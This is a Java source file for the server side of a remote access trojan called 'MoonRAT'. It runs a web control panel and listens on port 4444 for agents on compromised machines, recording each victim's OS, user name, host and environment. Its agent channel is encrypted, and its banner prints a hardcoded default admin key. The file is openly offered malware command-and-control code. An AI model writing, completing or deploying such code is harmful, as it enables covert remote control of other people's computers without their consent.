package moonrat.server;

import com.sun.net.httpserver.HttpServer;
import java.io.DataInputStream;
import java.io.FileDescriptor;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.Executors;
import moonrat.Protocol;
import moonrat.Protocol.Frame;

public final class MoonRAT {
    private MoonRAT() {}

    public static void main(String[] args) throws Exception {
        fixWindowsConsole();

        int httpPort = args.length > 0 ? Integer.parseInt(args[0]) : 8080;
        int agentPort = args.length > 1 ? Integer.parseInt(args[1]) : 4444;
        String channelKey = args.length > 2 ? args[2] : System.getenv("MOONRAT_KEY");
        int httpsPort = args.length > 3 ? Integer.parseInt(args[3]) : 8443;

        Protocol.usePassphrase(channelKey);
        Auth.load();

        AgentRegistry registry = new AgentRegistry();
        ApiHandler handler = new ApiHandler(registry);

        HttpServer http = HttpServer.create(new InetSocketAddress(httpPort), 0);
        http.createContext("/", handler);
        http.setExecutor(Executors.newCachedThreadPool());
        http.start();

        String httpsStatus;
        try {
            Tls.start(httpsPort, handler);
            httpsStatus = "https://127.0.0.1:" + httpsPort + " (self-signed)";
        } catch (Exception failure) {
            httpsStatus = "disabled (" + failure.getMessage() + ")";
        }

        System.out.println("  __  __                       ____      _  _____ ");
        System.out.println(" |  \\/  | ___   ___  _ __      |  _ \\    / \\|_   _|");
        System.out.println(" | |\\/| |/ _ \\ / _ \\| '_ \\     | |_) |  / _ \\ | |  ");
        System.out.println(" | |  | | (_) | (_) | | | |    |  _ <  / ___ \\| |  ");
        System.out.println(" |_|  |_|\\___/ \\___/|_| |_|    |_| \\_\\/_/   \\_\\_|  ");
        System.out.println();
        System.out.println("moonrat web   : http://127.0.0.1:" + httpPort);
        System.out.println("moonrat https : " + httpsStatus);
        System.out.println("moonrat agent : 0.0.0.0:" + agentPort);
        System.out.println("moonrat channel: " + (Protocol.secured() ? "aes-256-gcm" : "plaintext"));
        System.out.println("moonrat auth  : moonrat.keys (admin key parol123@@ by default)");

        try (ServerSocket listener = new ServerSocket(agentPort)) {
            while (true) {
                Socket socket = listener.accept();
                Executors.newCachedThreadPool().execute(() -> register(socket, registry));
            }
        }
    }

    private static void register(Socket socket, AgentRegistry registry) {
        try {
            socket.setTcpNoDelay(true);
            DataInputStream in = new DataInputStream(socket.getInputStream());

            Frame hello = Protocol.readFrame(in);
            if (hello.type != Protocol.HELLO || hello.fields.size() < 4) {
                socket.close();
                return;
            }

            AgentConnection agent = new AgentConnection(hello.fields.get(0), socket, in, registry);
            agent.os = hello.fields.get(1);
            agent.user = hello.fields.get(2);
            agent.host = hello.fields.get(3);
            if (hello.fields.size() > 4) agent.env = hello.fields.get(4);
            registry.register(agent);
            agent.start();
            System.out.println("[+] agent " + agent.id + " " + agent.user + "@" + agent.host
                    + " (" + agent.os + ") env=" + agent.env);
        } catch (Exception failure) {
            try {
                socket.close();
            } catch (IOException ignored) {
            }
        }
    }

    private static void fixWindowsConsole() {
        if (!System.getProperty("os.name").toLowerCase().contains("win")) return;

        try {
            new ProcessBuilder("cmd", "/c", "chcp", "65001").inheritIO().start().waitFor();
        } catch (Exception ignored) {
        }

        try {
            System.setOut(new PrintStream(new FileOutputStream(FileDescriptor.out), true, StandardCharsets.UTF_8));
            System.setErr(new PrintStream(new FileOutputStream(FileDescriptor.err), true, StandardCharsets.UTF_8));
        } catch (Exception ignored) {
        }
    }
}
